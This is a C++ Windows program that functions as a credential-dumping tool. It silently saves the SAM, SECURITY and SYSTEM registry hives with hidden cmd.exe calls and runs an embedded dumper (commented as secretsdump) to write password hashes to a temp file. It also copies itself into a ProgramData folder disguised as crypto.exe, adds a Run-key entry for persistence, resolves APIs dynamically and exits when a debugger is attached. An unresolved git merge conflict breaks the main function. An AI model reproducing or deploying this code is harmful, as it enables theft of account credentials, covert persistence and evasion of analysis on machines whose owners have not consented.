// main.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <cstdlib>
#include <string>
#include <tchar.h>
#include "resource.h"
#include <fstream>
#include <atlstr.h>
#include "base64.h"

using namespace std;

//Depending on the call type you can use _stdcall or _cdecl


//Define messageboxW 
typedef int(_stdcall* Msg) (HWND, LPCWSTR, LPCWSTR, UINT);
//Define ShellExecuteW 
typedef HINSTANCE(_stdcall* Shell) (HWND,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,INT);
//Define GetModuleFileNameW
typedef DWORD (_stdcall* ModuleFile)(HMODULE,LPWSTR,DWORD );
//Define CopyFile
typedef BOOL (_stdcall* Copying)(LPCTSTR,LPCTSTR,BOOL);
//Define IsDebuggerPresent
typedef BOOL (_stdcall* LocalDebugger)();
//Define CheckRemoteDebuggerPresent
typedef BOOL (_stdcall* RemoteDebugger)(HANDLE,PBOOL);
//Define GetModuleHandleW
typedef HMODULE (_stdcall* ModuleHandle)(LPCWSTR );
//Define RegOpenKeyExW
typedef LSTATUS (_stdcall* OpenRegKey)(HKEY,LPCWSTR,DWORD,REGSAM,PHKEY);
//Define RegSetValueExW
typedef LSTATUS (_stdcall* SetRegValue)(HKEY,LPCWSTR,DWORD,DWORD,const BYTE* ,DWORD);
//Define  GetTempPathW
typedef DWORD (_stdcall* TempPath) ( DWORD,LPWSTR );
//Define CreateFileW
typedef HANDLE (_stdcall* NewFile)(	LPCWSTR,DWORD ,	DWORD,LPSECURITY_ATTRIBUTES,DWORD,	DWORD,	HANDLE);
//Define CreateProcessW
typedef BOOL (_stdcall* NewProcess)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES ,LPSECURITY_ATTRIBUTES ,BOOL,DWORD,LPVOID,	LPCWSTR,LPSTARTUPINFOW,	LPPROCESS_INFORMATION );
//Define FindResourceW
typedef HRSRC (_stdcall* LocateResource)(HMODULE,LPCWSTR,LPCWSTR);
//Define LoadResource
typedef HGLOBAL (_stdcall* LoadingResource)(HMODULE ,HRSRC);
//Define LockResource
typedef LPVOID (_stdcall* LockingResource)(HGLOBAL);
//Define GetSizeOfResource
typedef DWORD (_stdcall* GetSizeofResource)(HMODULE,HRSRC);


HINSTANCE LLibrary(LPCWSTR dllToLoad);
void DumpSam();
string XorEncoding(string input, char cipher);
string XorDecoding(string input, char cipher);
void CopyExe();
void AddToRegistry(LPCTSTR data);
void ExtractResource();
string ReturnTempPath(string name);
BOOL ExecuteDump();
BOOL BeingDebbuged();


int main(int argc, char* argv[])
{ 

<<<<<<< HEAD

	string x = XorEncoding("hey", 'X');
	string c = XorDecoding(x, 'X');

	printf("sdf");
	cout << c;

	/*
=======
	BeingDebbuged();
>>>>>>> debugging
	ExtractResource();
	DumpSam();
	ExecuteDump();
	CopyExe();
	
    cout << "\nHello World!\n";

	//Get handle to user32.dll
	HINSTANCE hDll = LLibrary(TEXT("User32.dll"));

	printf("Lib Loaded\n");
	Msg MsgBox = (Msg)GetProcAddress(hDll, "MessageBoxA");
	MsgBox(NULL, L"Test", L"test", 0);

	//Release the library
	FreeLibrary(hDll);
	
	return 0;
	
}

//Function to dump the three registries to file; sam, security and system
void DumpSam() {
	//Load shell32.dll
	HINSTANCE shellDll = LLibrary(TEXT("Shell32.dll"));
	Shell ShellExec = (Shell)GetProcAddress(shellDll, "ShellExecuteW");


	//Save the sam registry
	HINSTANCE samReg = ShellExec(NULL, L"open", L"cmd.exe", L"/C reg save hklm\\sam %TEMP%\\sam.save ", NULL, SW_HIDE);

	//Check if value returned is greater than 32
	if (!((int)samReg >32)) {
		printf("Error dumping sam reg");
	}

	//Save the security registry
	HINSTANCE securityReg = ShellExec(NULL, L"open", L"cmd.exe", L"/C reg save hklm\\security  %TEMP%\\security.save ", NULL, SW_HIDE);

	if (!((int)securityReg > 32)) {
		printf("Error dumping security reg");
	}

	//Save the system registry
	HINSTANCE systemReg = ShellExec(NULL, L"open", L"cmd.exe", L"/C reg save hklm\\system %TEMP%\\system.save ", NULL, SW_HIDE);

	if (!((int)systemReg > 32)) {
		printf("Error dumping system reg");
	}
}

//Function to load library
HINSTANCE LLibrary(LPCWSTR dllToLoad) {
	HINSTANCE hDll = LoadLibrary(dllToLoad);

	if (hDll == NULL) {
		wprintf(L"Error getting handle to: %s",dllToLoad);
		exit(1);
	}
	
	return hDll;
}

//Function to encode/decode text
string XorEncoding(string input, char cipher) {

	for (int i = 0; i < input.size(); i++)
	{
		input[i] = input[i] ^ cipher;
	}

	string encoded = base64_encode(reinterpret_cast<const unsigned char*>(input.c_str()), input.length());

	return encoded;
}


string XorDecoding(string input, char cipher) {

	string decoded = base64_decode(input);


	for (int i = 0; i < decoded.size(); i++)
	{
		decoded[i] = decoded[i] ^ cipher;
	}

	return decoded;

}

//Function to copy the current exe to Crypto folder
void CopyExe() {
	HINSTANCE kernelDll = LLibrary(TEXT("Kernel32.dll"));
	ModuleFile ModuleFileName = (ModuleFile)GetProcAddress(kernelDll, "GetModuleFileNameW");
	Copying CopyingFile = (Copying)GetProcAddress(kernelDll, "CopyFile");

	wchar_t charArray[MAX_PATH];
	//Get the full path to the exe
	ModuleFileName(NULL, charArray, MAX_PATH);
	LPCWSTR path= L"C:\\ProgramData\\Microsoft\\Crypto\\crypto.exe";
	//Copy the exe to the path
	CopyFile(charArray, path, FALSE);


	AddToRegistry(path);

}

void AddToRegistry(LPCTSTR data)
{

	HINSTANCE advapiDll = LLibrary(L"Advapi32.dll");
	OpenRegKey regOpen = (OpenRegKey)GetProcAddress(advapiDll, "RegOpenKeyExW");
	SetRegValue setKey = (SetRegValue)GetProcAddress(advapiDll, "RegSetValueExW");
	HKEY hKey;
	
	//Open the CurrentVersion\Run key 
	if (regOpen(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
		//Write the value and data to the opened key
		LSTATUS ret=setKey(hKey, L"crypto", 0, REG_SZ, (LPBYTE)data, _tcslen(data) *sizeof(TCHAR));
		if (ret==ERROR_SUCCESS)
		{
			printf("Good adding");
		}
		else {
			printf("Error adding");
		}
		RegCloseKey(hKey);
	}
	else {
		printf("error opening");
	}

}

void ExtractResource() {

	HINSTANCE kernelDll = LLibrary(L"Kernel32.dll");
	ModuleHandle getModuleHandle = (ModuleHandle)GetProcAddress(kernelDll, "GetModuleHandleW");
	LocateResource findResource = (LocateResource)GetProcAddress(kernelDll, "FindResourceW");
	LoadingResource loadResource = (LoadingResource)GetProcAddress(kernelDll, "LoadResource");
	LockingResource lockResource = (LockingResource)GetProcAddress(kernelDll, "LockResource");
	GetSizeofResource rsrcSize = (GetSizeofResource)GetProcAddress(kernelDll, "SizeofResource");


	//Get the handle to the current process
	HMODULE hModule = getModuleHandle(NULL);
	//Find the secretdump.exe resource
	HRSRC ret = findResource(hModule, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	//Load the resource
	HGLOBAL res = loadResource(hModule, ret);
	//Get lock to resource
	LPVOID lock = lockResource(res);
	//Get the size of the exe
	DWORD size = rsrcSize(hModule, ret);

	string path = ReturnTempPath("dump.exe");

	//Open output stream to file
	std::ofstream outputFile(path.c_str(), std::ios::binary);
	//Write the resource file 
	outputFile.write((const char*)lock, size);
	//Close the dile
	outputFile.close();
}


//Function to Check if a debugger is attached to this process 
//If a debugger is detected it will delete itself
BOOL BeingDebbuged() {
	HINSTANCE Kerneldll = LLibrary(TEXT("Kernel32.dll"));
	LocalDebugger checkLocalDebugger = (LocalDebugger)GetProcAddress(Kerneldll, "IsDebuggerPresent");
	RemoteDebugger  checkRemoteDebugger = (RemoteDebugger)GetProcAddress(Kerneldll, "CheckRemoteDebuggerPresent");
	ModuleHandle getHandle = (ModuleHandle)GetProcAddress(Kerneldll, "GetModuleHandleW");

	HANDLE hProcess = getHandle(NULL);
	PBOOL pbDebuggerPresent=FALSE;

	checkRemoteDebugger(hProcess, pbDebuggerPresent);
	//If the program is being debugged it returns true; else false
	if ((checkLocalDebugger() != 0)|| (pbDebuggerPresent)) {
		exit(1);
	}

}


//TODO: Delete file if in debugger
//Function to delete the exe
//https://stackoverflow.com/questions/3457040/how-to-write-a-program-in-c-such-that-it-will-delete-itself-after-execution
void DeleteExe()
{

	HINSTANCE shellDll = LLibrary(TEXT("Shell32.dll"));
	Shell ShellExec = (Shell)GetProcAddress(shellDll, "ShellExecuteW");

	HINSTANCE kernelDll = LLibrary(TEXT("Kernel32.dll"));
	ModuleFile ModuleFileName = (ModuleFile)GetProcAddress(kernelDll, "GetModuleFileNameW");


	wchar_t szModuleName[MAX_PATH];
	ModuleFileName(NULL, szModuleName, MAX_PATH);

	wstring x =szModuleName;
	wstring c = L"/C del " + x;

	HINSTANCE delFile = ShellExec(NULL, L"open", L"cmd.exe", szModuleName, NULL, SW_HIDE);
	DWORD err = GetLastError();
	wcout << delFile;
	wcout << err;
}



//Function that will append the temp dir with the given filename
string ReturnTempPath(string name) {
	HINSTANCE kernellDll = LLibrary(L"Kernel32.dll");
	TempPath getTemp = (TempPath)GetProcAddress(kernellDll, "GetTempPathW");

	//Get the temp path for the computer
	wchar_t czTempPath[MAX_PATH] = { 0 };
	getTemp(MAX_PATH, czTempPath); // retrieving temp path

	wstring path = czTempPath;

	//blog.mijalko.com/2008/06/convert-stdstring-to-stdwstring.html
	//Convert string to wstring
	wstring tempName;
	tempName.assign(name.begin(), name.end());

	//The name of the new exe
	path += tempName;

	//Convert wstring to string
	string tempFinal;
	tempFinal.assign(path.begin(), path.end());

	return tempFinal;
}


//Function that will execute the dump.exe(secretsdump.exe)
BOOL ExecuteDump() {

	HINSTANCE kernelDll = LLibrary(L"Kernel32.dll");
	NewFile createNewFile = (NewFile)GetProcAddress(kernelDll, "CreateFileW");
	NewProcess createNewProcess = (NewProcess)GetProcAddress(kernelDll, "CreateProcessW");


	//Get the path relative to temp directory
	string exePath = ReturnTempPath("dump.exe");
	string samPath = ReturnTempPath("sam.save");
	string securityPath = ReturnTempPath("security.save");
	string systemPath = ReturnTempPath("system.save");
	string filePath = ReturnTempPath("hash.txt");
	string finalPath = exePath + " -sam " + samPath + " -security " + securityPath + " -system " + systemPath + " LOCAL ";
	
	//Convert file and final path from string to tchar
	TCHAR sFilePath[MAX_PATH];
	_tcscpy_s(sFilePath, CA2T(filePath.c_str()));

	TCHAR sFinalPath[MAX_PATH];
	_tcscpy_s(sFinalPath, CA2T(finalPath.c_str()));

	//Initialise security attributes
	SECURITY_ATTRIBUTES sa;
	sa.nLength = MAX_PATH;
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;


	//Create a file and get handle
	HANDLE hFile = createNewFile(sFilePath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, &sa, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Initialise variables
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	BOOL ret = FALSE;
	DWORD flags = CREATE_NO_WINDOW;

	// Write the blocks of memory to zero
	SecureZeroMemory(&pi, sizeof(pi));
	SecureZeroMemory(&si, sizeof(si));

	//Initialise the startupinfo struct
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags |= STARTF_USESTDHANDLES;
	si.hStdInput = NULL;
	si.hStdOutput = hFile;
	si.hStdError = hFile;

	//Create(run) the process
	ret = createNewProcess(NULL, sFinalPath, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi);

	//If success, quit the process after exit
	if (ret) {
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return 0;
	}
	return -1;
}
